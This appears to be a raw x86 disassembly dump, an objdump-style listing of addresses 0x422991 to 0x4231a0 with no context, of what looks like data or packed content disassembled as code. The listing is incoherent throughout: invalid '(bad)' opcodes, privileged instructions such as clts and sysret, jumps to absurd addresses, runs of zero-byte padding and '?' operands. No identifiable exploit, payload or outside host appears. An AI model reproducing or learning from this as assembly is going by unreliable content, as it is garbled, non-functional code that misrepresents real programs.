  422991:	stos   DWORD PTR es:[edi],eax
  422992:	cwde   
  422993:	jl     0x422998
  422995:	push   ecx
  422996:	es je  0x42294d
  422999:	pop    es
  42299a:	lock stos DWORD PTR es:[edi],eax
  42299c:	xchg   ecx,eax
  42299d:	sbb    eax,esi
  42299f:	outs   dx,BYTE PTR ds:[esi]
  4229a0:	pop    eax
  4229a1:	cli    
  4229a2:	jp     0x422a00
  4229a4:	mov    ah,0xfc
  4229a6:	call   0x71542c8e
  4229ab:	stc    
  4229ac:	mov    edi,0xf32af9ff
  4229b1:	xor    BYTE PTR [ebp+0x3c],0x3
  4229b5:	cld    
  4229b6:	add    BYTE PTR [eax],al
  4229b8:	add    BYTE PTR [eax],al
  4229ba:	add    BYTE PTR [esi-0x20],bl
  4229bd:	into   
  4229be:	(bad)  
  4229bf:	div    BYTE PTR [edx]
  4229c1:	dec    BYTE PTR [eax+ebp*8]
  4229c4:	sub    DWORD PTR [ecx+0x76],edi
  4229c7:	je     0x4229e5
  4229c9:	icebp  
  4229ca:	or     eax,DWORD PTR [esi+0x2588ffab]
  4229d0:	add    si,WORD PTR [edx+0x6d]
  4229d4:	push   0xe8a11102
  4229d9:	cdq    
  4229da:	add    esi,DWORD PTR [edx+0xa0790f4]
  4229e0:	(bad)  
  4229e1:	repz adc DWORD PTR [ebp+0x60fcadeb],esi
  4229e8:	pop    ss
  4229e9:	out    dx,al
  4229ea:	aas    
  4229eb:	jne    0x422a4d
  4229ed:	cmp    bl,BYTE PTR [ebx+ecx*2+0x30]
  4229f1:	cmp    eax,0xaaeb79c1
  4229f6:	xor    dl,bl
  4229f8:	add    DWORD PTR [eax+0x3e7d23],ecx
  4229fe:	xor    dh,BYTE PTR [ebp+0x3b88b0bf]
  422a04:	add    bh,ch
  422a06:	fidiv  DWORD PTR [ecx+0x26bc2d75]
  422a0c:	and    DWORD PTR es:[ecx-0xbf4c567],edx
  422a13:	sub    al,ch
  422a15:	outs   dx,BYTE PTR ds:[esi]
  422a16:	mov    ebp,0x4bb5fd6e
  422a1b:	xchg   ecx,eax
  422a1c:	jne    0x4229eb
  422a1e:	test   DWORD PTR [eax],0x0
  422a24:	mov    DWORD PTR [esi],edx
  422a26:	dec    ebp
  422a27:	repnz inc edx
  422a29:	add    ch,BYTE PTR [ebx+eax*2+0x7]
  422a2d:	das    
  422a2e:	mov    ds:0xd712f0ca,al
  422a33:	sbb    eax,0xbd5ecd5d
  422a38:	outs   dx,BYTE PTR ds:[esi]
  422a39:	mov    ecx,eax
  422a3b:	test   DWORD PTR [ebp+0xc],0x26c60699
  422a42:	in     eax,0x6
  422a44:	addr16 sahf 
  422a46:	(bad)  
  422a47:	ret    
  422a48:	inc    edx
  422a49:	xchg   DWORD PTR [ecx],ebp
  422a4b:	nop
  422a4c:	push   0x1af7a387
  422a51:	mov    eax,ds:0x38290541
  422a56:	and    dl,BYTE PTR [eax+0x5350e817]
  422a5c:	sbb    ebx,DWORD PTR [ebp+0x27]
  422a5f:	call   DWORD PTR [edx]
  422a61:	or     eax,0x6ff433a
  422a66:	and    al,0x3
  422a68:	xchg   ebp,eax
  422a69:	inc    edx
  422a6a:	jmp    0xb0724f3f
  422a6f:	sahf   
  422a70:	lods   eax,DWORD PTR ds:[esi]
  422a71:	push   edx
  422a72:	out    0x90,eax
  422a74:	adc    DWORD PTR [esi+ebx*2-0x4c],0x76
  422a79:	or     edi,DWORD PTR [edx+0x13]
  422a7c:	in     al,dx
  422a7d:	push   ss
  422a7e:	not    ecx
  422a80:	xor    BYTE PTR [eax],0x0
  422a83:	cwde   
  422a84:	mov    dh,0x83
  422a86:	adc    al,0xef
  422a88:	add    BYTE PTR [eax],al
  422a8a:	add    BYTE PTR [eax],al
  422a8c:	add    al,ah
  422a8e:	cmp    cl,BYTE PTR [eax-0x15]
  422a91:	in     al,0xe4
  422a93:	pop    edx
  422a94:	out    dx,al
  422a95:	inc    ecx
  422a96:	cmp    edi,esi
  422a98:	scas   al,BYTE PTR es:[edi]
  422a99:	jne    0x422ad5
  422a9b:	add    BYTE PTR [edx+0x74c0b6a8],ch
  422aa1:	jne    0x422a62
  422aa3:	add    BYTE PTR [ecx],cl
  422aa5:	mov    ecx,0xa4a02efb
  422aaa:	shl    DWORD PTR [edx-0x4e],1
  422aad:	mov    esi,0xc4126f01
  422ab2:	push   esi
  422ab3:	xchg   ecx,esp
  422ab5:	jb     0x422ac5
  422ab7:	mov    dl,0xf1
  422ab9:	popa   
  422aba:	mov    dh,0xc6
  422abc:	(bad)  
  422abd:	imul   edi,DWORD PTR [ebp+0x31f8f63c],0xf925c7f7
  422ac7:	mov    bh,0x36
  422ac9:	jno    0x422acd
  422acb:	add    bh,al
  422acd:	push   ebp
  422ace:	cli    
  422acf:	ds (bad) 
  422ad1:	mov    edi,0x3d874a37
  422ad6:	dec    ebx
  422ad7:	(bad)  
  422ad8:	call   0x3bb1:0xde575e5f
  422adf:	(bad)  
  422ae0:	mov    ecx,0xed89655f
  422ae5:	rol    cl,1
  422ae7:	das    
  422ae8:	and    BYTE PTR [ebx+esi*4+0x3b76aacc],dl
  422aef:	mov    eax,0xa1
  422af4:	add    BYTE PTR [eax],al
  422af6:	inc    edx
  422af7:	inc    edx
  422af8:	add    BYTE PTR [edi],dh
  422afa:	ins    BYTE PTR es:[edi],dx
  422afb:	or     eax,DWORD PTR [edi+0x1aed37db]
  422b01:	sbb    al,BYTE PTR [edi+0x2900f264]
  422b07:	ja     0x422b0d
  422b09:	ins    BYTE PTR es:[edi],dx
  422b0a:	fisttp WORD PTR [edi]
  422b0c:	xor    BYTE PTR [eax-0x28],0x81
  422b10:	mov    ebx,0x6fc38d04
  422b15:	(bad)  
  422b16:	pop    DWORD PTR [esi]
  422b18:	jl     0x422afb
  422b1a:	and    eax,0x5fccaff4
  422b1f:	push   es
  422b20:	pop    edx
  422b21:	ret    
  422b22:	sub    eax,0x8c43c74b
  422b27:	ret    
  422b28:	imul   eax,DWORD PTR [edx],0xffffff9c
  422b2b:	dec    BYTE PTR [esp+ecx*4]
  422b2e:	dec    esp
  422b2f:	(bad)  
  422b30:	(bad)  
  422b31:	jmp    FWORD PTR [edx-0x53]
  422b34:	xor    dl,dl
  422b36:	rol    BYTE PTR ds:0x7b53fffc,cl
  422b3c:	leave  
  422b3d:	mov    ebx,DWORD PTR [eax+0x71]
  422b40:	mov    bh,0xcc
  422b42:	clts   
  422b44:	xor    DWORD PTR [ecx+eiz*8],eax
  422b47:	dec    ebp
  422b48:	mov    DWORD PTR [ebx+0x5c],0x5833c5e3
  422b4f:	jno    0x422b04
  422b51:	int3   
  422b52:	clts   
  422b54:	mov    eax,edi
  422b56:	jge    0x422b75
  422b58:	and    bh,0x0
  422b5b:	add    BYTE PTR [eax],al
  422b5d:	add    BYTE PTR [eax],al
  422b5f:	sbb    eax,0x5cbcffd3
  422b64:	ss inc eax
  422b66:	add    BYTE PTR [edi],bh
  422b68:	cli    
  422b69:	xchg   ah,ch
  422b6b:	jle    0x422b2f
  422b6d:	sti    
  422b6e:	inc    ecx
  422b6f:	test   ecx,edi
  422b71:	xchg   BYTE PTR [eax-0x7f043db0],bh
  422b77:	push   es
  422b78:	sbb    bh,bl
  422b7a:	dec    DWORD PTR [edx+edi*2]
  422b7d:	mov    edx,0xfa75d681
  422b82:	push   DWORD PTR [ebp-0x15]
  422b85:	sub    BYTE PTR [edi],0xf0
  422b88:	xlat   BYTE PTR ds:[ebx]
  422b89:	cwde   
  422b8a:	mov    eax,0x87042ca9
  422b8f:	je     0x422b8d
  422b91:	inc    esp
  422b92:	add    al,0x96
  422b94:	test   eax,0xb3ee0133
  422b99:	and    ebx,0x74
  422b9c:	je     0x422bde
  422b9e:	mov    ebp,0x43a0b5
  422ba3:	push   dx
  422ba5:	js     0x422ba3
  422ba7:	mov    ds:0x66e8d588,al
  422bac:	or     DWORD PTR [ebp+0x8aaf639],0xffffff81
  422bb3:	mov    edi,?
  422bb5:	fnstcw WORD PTR [edi]
  422bb7:	jne    0x422ba0
  422bb9:	rol    DWORD PTR [edi+0x3fd9d768],cl
  422bbf:	jne    0x422b4b
  422bc1:	mov    esp,0xcc
  422bc6:	add    BYTE PTR [eax],al
  422bc8:	mov    dh,0xeb
  422bca:	xor    al,cl
  422bcc:	xchg   esi,eax
  422bcd:	and    DWORD PTR [ebx],esi
  422bcf:	shr    esi,0x32
  422bd2:	aad    0xe8
  422bd4:	test   BYTE PTR [ecx+0x5],0x2f
  422bd8:	jno    0x422c38
  422bda:	(bad)
  422bde:	pop    esi
  422bdf:	das    
  422be0:	jo     0x422bf5
  422be2:	sar    BYTE PTR [edi],cl
  422be4:	jne    0x422b9f
  422be6:	mov    ds:0xffac4374,al
  422beb:	cs xor eax,0xdd851064
  422bf1:	cs inc ebx
  422bf3:	add    BYTE PTR [ebp-0x493347b4],dh
  422bf9:	jmp    0x422b85
  422bfb:	shl    DWORD PTR [ebx+eax*1],0xb
  422bff:	das    
  422c00:	sub    eax,0x98c46e02
  422c05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c06:	inc    ecx
  422c07:	ds out dx,al
  422c09:	ret    0xac9
  422c0c:	xchg   edx,eax
  422c0d:	retf   0xc45e
  422c10:	nop
  422c11:	xchg   BYTE PTR [edx-0x363d2efe],ah
  422c17:	adc    bl,BYTE PTR [edx-0x4b3ba136]
  422c1d:	jmp    0xc4f662f9
  422c22:	cmp    al,0x8f
  422c24:	mov    eax,ds:0x2d6c3852
  422c29:	shl    BYTE PTR [esi],1
  422c2b:	add    al,0x0
  422c2d:	add    BYTE PTR [eax],al
  422c2f:	add    BYTE PTR [eax],al
  422c31:	sahf   
  422c32:	push   cs
  422c33:	leave  
  422c34:	adc    eax,0x48740235
  422c39:	lea    edx,[ecx+0x7a]
  422c3c:	sbb    BYTE PTR ds:0xf8042913,ch
  422c42:	shl    esp,0xb
  422c45:	jle    0x422c55
  422c47:	add    DWORD PTR [edi],edx
  422c49:	mov    ch,0x2
  422c4b:	dec    esi
  422c4c:	push   es
  422c4d:	repnz cmp eax,0xf90ceb51
  422c53:	dec    edx
  422c54:	add    ah,BYTE PTR [edx+eax*1]
  422c57:	xor    dh,al
  422c59:	fnstsw WORD PTR [edx+0x13]
  422c5c:	inc    esi
  422c5d:	jne    0x422c56
  422c5f:	fcom   QWORD PTR [edi]
  422c61:	jae    0x422ca5
  422c63:	jmp    0x6178222e
  422c68:	loopne 0x422cdc
  422c6a:	add    ch,cl
  422c6c:	push   esi
  422c6d:	repnz adc eax,0x2b515f5
  422c73:	mov    bl,0x5a
  422c75:	repnz xor eax,0x2b515e1
  422c7b:	je     0x422cae
  422c7d:	iret   
  422c7e:	or     al,BYTE PTR [eax]
  422c80:	pop    ss
  422c81:	mov    ebx,0x1cee5202
  422c86:	cmp    DWORD PTR ds:0x37d2a1,0xffffffe9
  422c8d:	arpl   WORD PTR [eax],dx
  422c8f:	call   0xfc38a111
  422c94:	add    BYTE PTR gs:[eax],al
  422c97:	add    BYTE PTR [eax],al
  422c99:	add    BYTE PTR [ecx+0x7aae116e],dh
  422c9f:	mov    dh,0xdd
  422ca1:	sub    dh,BYTE PTR [ecx-0x20]
  422ca4:	or     BYTE PTR [ebx],ch
  422ca6:	jns    0x422c6c
  422ca8:	add    eax,0x379a71
  422cad:	call   0x601227fe
  422cb2:	sub    esp,edx
  422cb4:	aas    
  422cb5:	jmp    0x821627f6
  422cba:	sbb    ah,bh
  422cbc:	sti    
  422cbd:	xchg   BYTE PTR [edi],ch
  422cbf:	jg     0x422cb9
  422cc1:	jle    0x422c63
  422cc3:	jg     0x422c88
  422cc5:	push   ss
  422cc6:	pop    ss
  422cc7:	dec    edi
  422cc8:	mov    edi,0x41e32b2
  422ccd:	fist   WORD PTR [edi+ebx*1+0x547d0544]
  422cd4:	inc    eax
  422cd5:	bound  ebp,QWORD PTR [ecx+0x6d]
  422cd8:	add    al,0x1a
  422cda:	xor    edi,ebx
  422cdc:	or     edx,DWORD PTR [ecx-0x2]
  422cdf:	cli    
  422ce0:	sti    
  422ce1:	ds or  al,0xf3
  422ce5:	aas    
  422ce6:	lock mov bh,0xff
  422ce9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422cea:	xchg   edx,eax
  422ceb:	or     bl,BYTE PTR [edx+0x2b]
  422cee:	jge    0x422cf2
  422cf0:	push   edx
  422cf1:	fisubr DWORD PTR [ecx+edi*1]
  422cf4:	je     0x422cc3
  422cf6:	jb     0x422d6c
  422cf8:	and    BYTE PTR [esi+0x7cb485],dh
  422cfe:	add    BYTE PTR [eax],al
  422d00:	add    BYTE PTR [eax],al
  422d02:	add    BYTE PTR [eax+0xf],al
  422d05:	dec    edi
  422d06:	mov    eax,0x30b
  422d0b:	je     0x422cce
  422d0d:	idiv   edi
  422d0f:	or     eax,DWORD PTR [esi-0x7517dbb4]
  422d15:	add    al,0xe
  422d17:	xchg   edx,eax
  422d18:	xor    eax,0x6cdc2474
  422d1d:	fistp  WORD PTR [edi-0x76]
  422d20:	ror    BYTE PTR [eax+eax*1],0x71
  422d24:	test   esp,ebp
  422d26:	cmp    DWORD PTR [eax-0x7e00b1f2],0xe
  422d2d:	call   0xfc4438cf
  422d32:	mov    ecx,DWORD PTR [esp+ecx*4]
  422d35:	jne    0x422d2f
  422d37:	add    al,0x30
  422d39:	idiv   edi
  422d3b:	or     ebp,DWORD PTR [eax+eax*1+0x74028c01]
  422d42:	adc    bl,ah
  422d44:	aas    
  422d45:	in     al,dx
  422d46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d47:	add    eax,0x51c70043
  422d4c:	out    dx,al
  422d4d:	mov    eax,0xe2fe4c89
  422d52:	push   cs
  422d53:	mov    ds:0xe5b8ec3c,eax
  422d58:	inc    ecx
  422d59:	add    bh,al
  422d5b:	adc    edx,esi
  422d5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d5e:	mov    DWORD PTR [edx+eax*1],ecx
  422d61:	dec    ebx
  422d62:	xor    edx,DWORD PTR [edi+0xfc5d88]
  422d68:	add    BYTE PTR [eax],al
  422d6a:	add    BYTE PTR [eax],al
  422d6c:	lds    edx,FWORD PTR [eax+edx*1+0x3b]
  422d70:	jg     0x422d84
  422d72:	jle    0x422d8f
  422d74:	dec    ebp
  422d75:	add    al,BYTE PTR [eax]
  422d77:	mov    esp,ecx
  422d79:	or     DWORD PTR [ebx-0x20],edi
  422d7c:	sub    al,0x89
  422d7e:	inc    ebp
  422d7f:	hlt    
  422d80:	jne    0x422d36
  422d82:	test   BYTE PTR [ebp-0x7b],bh
  422d85:	jmp    0x125f57fc
  422d8a:	add    esp,edi
  422d8c:	or     dl,BYTE PTR [ebx-0x1]
  422d8f:	add    BYTE PTR [ebp-0x15],dh
  422d92:	jae    0x422da4
  422d94:	xor    bl,BYTE PTR [edi+0x2bfca4eb]
  422d9a:	add    al,0xc3
  422d9c:	xor    bl,bl
  422d9e:	mov    esp,0xe6eb3589
  422da3:	or     dh,BYTE PTR [edx-0x3470fe2]
  422da9:	sub    eax,DWORD PTR [ebx+eax*8]
  422dac:	xor    BYTE PTR [ebx-0x14ca7658],bh
  422db2:	jle    0x422e19
  422db4:	gs jmp 0x422e35
  422db7:	jge    0x422d62
  422db9:	jmp    0x422e2e
  422dbb:	sub    bh,dh
  422dbd:	test   al,0x27
  422dbf:	inc    ebp
  422dc0:	mov    eax,ds:0x2301fc68
  422dc5:	mov    edi,0x7c93ace7
  422dca:	sti    
  422dcb:	xchg   DWORD PTR [ebp+0x10543],edi
  422dd1:	add    BYTE PTR [eax],al
  422dd3:	add    BYTE PTR [eax],al
  422dd5:	jne    0x422dc2
  422dd7:	push   ds
  422dd8:	enter  0xa33e,0x79
  422ddc:	push   cs
  422ddd:	(bad)  
  422dde:	lods   eax,DWORD PTR ds:[esi]
  422ddf:	or     esp,DWORD PTR [esi-0x6b]
  422de2:	ret    
  422de3:	mov    DWORD PTR gs:[ecx-0x4e],edi
  422de7:	mov    WORD PTR [ebp+0x59],ds
  422dea:	inc    edx
  422deb:	mov    al,ds:0xf5eb7500
  422df0:	inc    ebp
  422df1:	jge    0x422dfe
  422df3:	js     0x422e24
  422df5:	clc    
  422df6:	vmwrite eax,DWORD PTR [edx]
  422df9:	inc    ebx
  422dfa:	sahf   
  422dfb:	pop    es
  422dfc:	sub    BYTE PTR [ecx-0x52142ffe],0xf4
  422e03:	sbb    bh,bh
  422e05:	fwait
  422e06:	call   ebp
  422e08:	sar    DWORD PTR [ebp+ebp*8+0x6f438918],1
  422e0f:	loopne 0x422e62
  422e11:	xchg   ebx,eax
  422e12:	or     esp,DWORD PTR [ecx-0xd0c3c15]
  422e18:	(bad)  
  422e19:	repnz inc esi
  422e1b:	fisttp QWORD PTR [esi]
  422e1d:	daa    
  422e1e:	ret    0x834b
  422e21:	mov    ch,0x31
  422e23:	inc    ebx
  422e24:	lea    edi,[ecx+0x5b]
  422e27:	mov    esi,0xf93ef262
  422e2c:	mov    cl,BYTE PTR [ecx+0x7f]
  422e2f:	aad    0x8a
  422e31:	xor    BYTE PTR [esi],al
  422e33:	ins    BYTE PTR es:[edi],dx
  422e34:	aas    
  422e35:	sbb    eax,0x84a931
  422e3a:	add    BYTE PTR [eax],al
  422e3c:	add    BYTE PTR [eax],al
  422e3e:	mov    edi,0x7543609d
  422e43:	add    eax,0x213c37c
  422e48:	xor    DWORD PTR [ebx-0x3c99fc6b],eax
  422e4e:	jo     0x422e3a
  422e50:	pop    ebp
  422e51:	std    
  422e52:	mov    ?,esp
  422e54:	jnp    0x422e9e
  422e56:	jge    0x422e5b
  422e58:	add    ecx,DWORD PTR [edi]
  422e5a:	mov    edi,0xec65b8fd
  422e5f:	cld    
  422e60:	repz daa 
  422e62:	addr16 ds icebp 
  422e65:	add    ecx,esp
  422e67:	add    esp,DWORD PTR [edx+ebx*8-0x17]
  422e6b:	pop    es
  422e6c:	pop    esi
  422e6d:	dec    eax
  422e6e:	imul   ebx,DWORD PTR [esi+eiz*2+0x7f],0x7809f4ad
  422e76:	jle    0x422e64
  422e78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e79:	or     ebp,DWORD PTR [ebp+0x6e]
  422e7c:	add    al,bl
  422e7e:	dec    esi
  422e7f:	add    edi,edx
  422e81:	xor    ebp,DWORD PTR cs:[ebx-0x458162ff]
  422e88:	loopne 0x422ea8
  422e8a:	jbe    0x422e8e
  422e8c:	(bad)  
  422e8d:	call   0x11b7aa05
  422e92:	mov    bh,0xf7
  422e94:	inc    ebp
  422e95:	(bad)  [edi-0x28]
  422e98:	or     ebp,DWORD PTR [ebx+0x6]
  422e9b:	stc    
  422e9c:	sti    
  422e9d:	neg    BYTE PTR [eax+0xe145f0]
  422ea3:	add    BYTE PTR [eax],al
  422ea5:	add    BYTE PTR [eax],al
  422ea7:	xchg   BYTE PTR [ebx+0x74],cl
  422eaa:	add    dl,dh
  422eac:	lock je 0x422ea3
  422eaf:	in     eax,dx
  422eb0:	cmp    eax,0x7245640c
  422eb5:	cli    
  422eb6:	inc    edi
  422eb7:	hlt    
  422eb8:	cmp    DWORD PTR [eax],esp
  422eba:	cmp    al,0x7c
  422ebc:	jae    0x422ea7
  422ebe:	jmp    0x422ef0
  422ec0:	ins    DWORD PTR es:[edi],dx
  422ec1:	hlt    
  422ec2:	ret    0x7b74
  422ec5:	inc    ebp
  422ec6:	frstor [ebp-0x37]
  422ec9:	repnz sub al,0x79
  422ecc:	add    BYTE PTR [edx+0x70],ah
  422ecf:	test   DWORD PTR [edx+0x74],esi
  422ed2:	cli    
  422ed3:	imul   ebp,DWORD PTR [edi+0x618e6a08],0xf9f5f26e
  422edd:	jbe    0x422ed5
  422edf:	js     0x422f54
  422ee1:	ror    DWORD PTR [ecx+0x62088913],0x3b
  422ee8:	pop    eax
  422ee9:	leave  
  422eea:	sub    eax,DWORD PTR [ebp+0x65725502]
  422ef0:	push   ecx
  422ef1:	push   ecx
  422ef2:	mov    esi,0xcc8d09cc
  422ef7:	dec    esi
  422ef8:	pop    edx
  422ef9:	call   0xf83b2dfe
  422efe:	inc    edi
  422f00:	inc    ebx
  422f01:	or     BYTE PTR [ebx+0x17e84e8b],cl
  422f07:	scas   al,BYTE PTR es:[edi]
  422f08:	(bad)  
  422f09:	inc    DWORD PTR [eax+eax*1+0x0]
  422f10:	pop    esp
  422f11:	imul   edi,edi,0xffffffb7
  422f14:	xor    ebp,0x0
  422f17:	add    BYTE PTR [edi+0x21],dh
  422f1a:	bound  ecx,QWORD PTR [edx]
  422f1c:	mov    cl,0x73
  422f1e:	clc    
  422f1f:	pop    eax
  422f20:	fs xor bl,0xff
  422f24:	add    ecx,DWORD PTR [edx-0x4268f7b3]
  422f2a:	push   eax
  422f2b:	call   0x42df1a
  422f30:	pop    ecx
  422f31:	mov    edi,0xf5140775
  422f36:	test   DWORD PTR [eax],0x32fae9cc
  422f3c:	sbb    al,0x56
  422f3e:	leave  
  422f3f:	ret    0xfed8
  422f42:	push   esp
  422f43:	mov    esi,DWORD PTR [eax-0x3395cd98]
  422f49:	push   ecx
  422f4a:	not    DWORD PTR ds:0x400c8c
  422f50:	daa    
  422f51:	dec    esp
  422f52:	or     al,0x83
  422f54:	fadd   DWORD PTR [edx]
  422f56:	bound  esi,QWORD PTR [edx]
  422f58:	adc    DWORD PTR [edx+0x4],ecx
  422f5b:	push   ecx
  422f5c:	hlt    
  422f5d:	xchg   esi,eax
  422f5e:	cmp    al,0x0
  422f60:	pushf  
  422f61:	jnp    0x422f23
  422f63:	js     0x422f03
  422f65:	jnp    0x422f31
  422f67:	jne    0x422ef2
  422f69:	mov    eax,0x69c7627
  422f6e:	lea    eax,[ebp+0x60]
  422f71:	push   esi
  422f72:	call   0x423019
  422f77:	add    BYTE PTR [eax],al
  422f79:	add    BYTE PTR [esi],0x0
  422f7c:	test   DWORD PTR [ebp+0x51],esi
  422f7f:	jae    0x422f90
  422f81:	cmc    
  422f82:	add    DWORD PTR [esi],esp
  422f84:	jne    0x423001
  422f86:	pop    ebx
  422f87:	jge    0x422f8a
  422f89:	jne    0x422f41
  422f8b:	pop    es
  422f8c:	das    
  422f8d:	xor    eax,0x6b3f86c2
  422f92:	inc    esp
  422f93:	cmp    DWORD PTR [ebp-0xd7d2e4a],ecx
  422f99:	test   eax,0xf10a89c1
  422f9e:	and    dh,BYTE PTR [ebx+0x28]
  422fa1:	cmc    
  422fa2:	adc    ch,BYTE PTR [edi]
  422fa4:	jne    0x423009
  422fa6:	jne    0x422ff5
  422fa8:	add    ebp,esi
  422faa:	add    dh,BYTE PTR [edi+0x74]
  422fad:	jo     0x42300a
  422faf:	neg    BYTE PTR [eax+0x68]
  422fb2:	loop   0x422f3c
  422fb4:	retf   0x6fdd
  422fb7:	or     al,0x0
  422fb9:	jne    0x422f8f
  422fbb:	adc    dl,BYTE PTR [ebx-0x12]
  422fbe:	ror    DWORD PTR [ebx+0xce0ddd2],cl
  422fc4:	add    BYTE PTR [ebp+0x28],dh
  422fc7:	jmp    0x422fce
  422fc9:	xchg   BYTE PTR [edx+0x646d895e],dh
  422fcf:	inc    ecx
  422fd0:	or     al,bh
  422fd2:	fwait
  422fd3:	jo     0x422fe0
  422fd5:	cmc    
  422fd6:	jecxz  0x423005
  422fd8:	jne    0x423049
  422fda:	pop    ebx
  422fdb:	jl     0x422fde
  422fdd:	add    BYTE PTR [eax],al
  422fdf:	add    BYTE PTR [eax],al
  422fe1:	add    BYTE PTR [ebp+0xe],dh
  422fe4:	add    BYTE PTR [edi],ch
  422fe6:	mov    ch,0x84
  422fe8:	dec    BYTE PTR [edi-0x63]
  422feb:	clc    
  422fec:	idiv   bl
  422fee:	or     BYTE PTR [ecx],0x8d
  422ff1:	aas    
  422ff2:	cmp    eax,0x7508c216
  422ff7:	push   ss
  422ff8:	mov    ebp,esp
  422ffa:	test   BYTE PTR [ecx],0x4d
  422ffd:	cld    
  422ffe:	hlt    
  422fff:	frstor [ebp+0x0]
  423002:	jne    0x423006
  423004:	mov    dh,0x8e
  423006:	mov    al,0xfa
  423008:	pop    ebp
  423009:	pop    es
  42300a:	jle    0x422fc5
  42300c:	mov    cl,0x47
  42300e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42300f:	test   DWORD PTR [ebx],ebp
  423011:	sti    
  423012:	add    esi,ecx
  423014:	xor    al,BYTE PTR [esi*2+0x51706059]
  42301b:	push   ss
  42301c:	jo     0x42308e
  42301e:	pop    ecx
  42301f:	adc    al,BYTE PTR [ebx-0x5389ccc2]
  423025:	dec    ebp
  423026:	xchg   edi,eax
  423027:	sub    eax,0x5c4e701f
  42302c:	out    0x5c,eax
  42302e:	xchg   edi,eax
  42302f:	jnp    0x422fde
  423031:	pop    ds
  423032:	pop    ebp
  423033:	add    DWORD PTR [ebx],edi
  423035:	dec    esp
  423036:	inc    eax
  423037:	push   0x6839445e
  42303c:	test   al,0xe3
  42303e:	ins    DWORD PTR es:[edi],dx
  42303f:	push   0x6de8cbee
  423044:	or     eax,0x1c
  423049:	add    BYTE PTR [eax],al
  42304b:	push   edi
  42304c:	jnp    0x42306b
  42304e:	and    BYTE PTR [ebx-0x37],ah
  423051:	sub    eax,0xe9716120
  423056:	add    esi,DWORD PTR [edx+ebx*8-0x60]
  42305a:	add    DWORD PTR [esi+0x513f60f0],ebp
  423060:	push   ss
  423061:	faddp  st(1),st
  423063:	outs   dx,BYTE PTR ds:[esi]
  423064:	xchg   BYTE PTR [esi],ah
  423066:	push   es
  423067:	jne    0x42306b
  423069:	cmp    esp,ebp
  42306b:	inc    ecx
  42306c:	and    eax,0x4f203e9
  423071:	je     0x4230be
  423073:	pop    ebp
  423074:	push   0x5333436e
  423079:	add    BYTE PTR [ecx+0x6efb0561],al
  42307f:	stc    
  423080:	inc    esi
  423081:	and    al,0xf9
  423083:	mov    ds:0x90650bc4,eax
  423088:	lock sti 
  42308a:	jmp    0xa6a0b35
  42308f:	jno    0x423093
  423091:	sti    
  423092:	mov    ebp,0x49e81262
  423097:	nop
  423098:	add    al,BYTE PTR [eax]
  42309a:	bound  edi,QWORD PTR [ebx-0xc]
  42309d:	add    al,ch
  42309f:	call   0xfee9:0x22297f05
  4230a6:	fnstenv [esi]
  4230a8:	jle    0x4230f1
  4230aa:	in     eax,dx
  4230ab:	test   eax,0x95fb52
  4230b0:	add    BYTE PTR [eax],al
  4230b2:	add    BYTE PTR [eax],al
  4230b4:	push   0xa
  4230b6:	mov    al,0xea
  4230b8:	nop
  4230b9:	push   es
  4230ba:	pop    edx
  4230bb:	adc    DWORD PTR [esi+0x18],esi
  4230be:	sti    
  4230bf:	div    BYTE PTR [ebx-0x3e]
  4230c2:	or     esp,DWORD PTR [ebp-0x28]
  4230c5:	add    DWORD PTR [eax],eax
  4230c7:	jmp    0x964d20bd
  4230cc:	xor    DWORD PTR [esi],edi
  4230ce:	sub    eax,0x2ccd7
  4230d3:	push   ebp
  4230d4:	sub    DWORD PTR [edx],edi
  4230d6:	je     0x4230b3
  4230d8:	mov    ebp,0xe9d52476
  4230dd:	dec    esi
  4230de:	and    al,0xdd
  4230e0:	sahf   
  4230e1:	nop
  4230e2:	add    ebp,DWORD PTR [esi-0x173a2654]
  4230e8:	jbe    0x4230ec
  4230ea:	xchg   DWORD PTR ds:0xe9661255,edx
  4230f0:	and    BYTE PTR [ecx],al
  4230f2:	lea    esp,ds:0x501355
  4230f8:	pop    es
  4230f9:	in     al,dx
  4230fa:	call   0xf82cc251
  4230ff:	test   BYTE PTR [edx+esi*2],bl
  423102:	sbb    al,0x80
  423104:	pop    eax
  423105:	sysret 
  423107:	add    eax,0xe84dfb41
  42310c:	cmp    bl,BYTE PTR [ebx+0x7b7fff7]
  423112:	cmp    BYTE PTR [eax+esi*2-0x7],0x3
  423117:	jne    0x423119
  423119:	add    BYTE PTR [eax],al
  42311b:	add    BYTE PTR [eax],al
  42311d:	push   edx
  42311e:	push   ecx
  42311f:	call   0xf82beeef
  423124:	call   0x392d40
  423129:	lahf   
  42312a:	cmp    ah,BYTE PTR [eax+edx*1]
  42312d:	pop    ebx
  42312e:	fild   DWORD PTR [ebp+0x62030c01]
  423134:	add    DWORD PTR [ebx-0x1],ebp
  423137:	addr16 adc bl,ah
  42313a:	add    dl,BYTE PTR [eax-0x1]
  42313d:	and    DWORD PTR [ebx+0xa],esp
  423140:	inc    eax
  423141:	or     al,0x5d
  423143:	add    BYTE PTR [ebp+0x942260],cl
  423149:	fadd   QWORD PTR [edx]
  42314b:	push   eax
  42314c:	push   0x292f3c69
  423151:	(bad)  
  423152:	sti    
  423153:	fild   DWORD PTR [eax]
  423155:	fadd   QWORD PTR [edi+0x34c2484]
  42315b:	add    BYTE PTR [eax],al
  42315d:	pop    esp
  42315e:	fisub  WORD PTR [eax-0x7b1604aa]
  423164:	rcr    BYTE PTR [ebx-0x63feb292],0x2
  42316b:	bound  eax,QWORD PTR [ecx]
  42316d:	sub    DWORD PTR [edi+0x28cfc24],edx
  423173:	add    al,ch
  423175:	jne    0x42317d
  423177:	mov    esp,0xbf657500
  42317c:	or     edi,ecx
  42317e:	mov    esi,0xfffe
  423183:	add    BYTE PTR [eax],al
  423185:	add    BYTE PTR [ebp+0x70],dh
  423188:	or     ah,BYTE PTR [eax+ecx*4]
  42318b:	sbb    eax,DWORD PTR [eax*4+0x448acd35]
  423192:	cdq    
  423193:	hlt    
  423194:	xor    al,0xd7
  423196:	popf   
  423197:	scas   eax,DWORD PTR es:[edi]
  423198:	sbb    ecx,DWORD PTR [ebx]
  42319a:	sbb    BYTE PTR [esi-0x6a],0x0
  42319e:	jne    0x42317b
  4231a0:	ins    DWORD PTR es:[edi],dx
